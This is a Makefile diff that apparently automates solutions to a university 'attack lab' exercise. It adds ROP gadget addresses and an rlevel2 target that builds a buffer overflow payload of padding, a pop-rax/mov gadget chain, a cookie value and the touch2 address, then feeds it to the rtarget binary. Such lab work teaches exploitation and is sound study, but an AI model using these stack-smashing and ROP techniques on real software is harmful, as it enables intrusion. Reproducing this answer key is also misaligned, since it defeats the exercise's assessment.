@@ -7,8 +7,13 @@ OUT := builds
 SRC := src
 COOKIE := $(shell cat cookie.txt)
 COOKIE_PURE := $(shell echo $(COOKIE) | sed 's/^0x//')
+COOKIE_PADDED := $(shell printf "%016s" $(COOKIE_PURE) | tr ' ' '0')
+COOKIE_QWORD_BYTES := $(shell \
+    echo $(COOKIE_PADDED) \
+    | sed 's/../& /g' \
+    | awk '{ for (i=NF;i>=1;i--) printf "%s ", $$i }' \
+)
 COOKIE_ASCII_HEX := $(shell printf '%s\0' $(COOKIE_PURE) | xxd -p | sed 's/../& /g')
-
 
 BUF_ADDR := 0x5563e958
 BUF_ADDR_STR := 58 e9 63 55 00 00 00 00
@@ -19,6 +24,10 @@ TOUCH2_ADDR_STR := 04 8a 80 00 00 00 00 00
 TOUCH3_ADDR := 0x0000000000808b1b
 TOUCH3_ADDR_STR := 1b 8b 80 00 00 00 00 00
 
+G_POP_RAX := 0x808bcc
+G_POP_RAX_STR := cc 8b 80 00 00 00 00 00
+G_MOV_RAX_RDI := 0x808bda
+G_MOV_RAX_RDI_STR := da 8b 80 00 00 00 00 00
 
 disas_ctarget:
 	mkdir -p $(OUT)
@@ -102,6 +111,21 @@ level3: $(OUT)/level3_payload.hex disas_ctarget
 	echo -n "$(COOKIE_ASCII_HEX)" >> $(SRC)/ctarget03.txt
 	./hex2raw < $(SRC)/ctarget03.txt > $(OUT)/level3-raw.txt
 	./ctarget < $(OUT)/level3-raw.txt
+
+rlevel2: disas_rtarget
+	mkdir -p $(SRC)
+	rm -f $(SRC)/target04.txt
+	for i in `seq 24`; do \
+		echo -n "41 " >> $(SRC)/target04.txt; \
+	done
+	echo -n $(G_POP_RAX_STR) >> $(SRC)/target04.txt
+	echo -n " " >> $(SRC)/target04.txt
+	echo -n "$(COOKIE_QWORD_BYTES)" >> $(SRC)/target04.txt
+	echo -n "$(G_MOV_RAX_RDI_STR) " >> $(SRC)/target04.txt
+	echo "$(TOUCH2_ADDR_STR)" >> $(SRC)/target04.txt
+	$(HEX2RAW) < $(SRC)/target04.txt > $(OUT)/rtarget02-raw
+	$(RTARGET) < $(OUT)/rtarget02-raw
+
 
 run_c:
 	$(CTARGET)
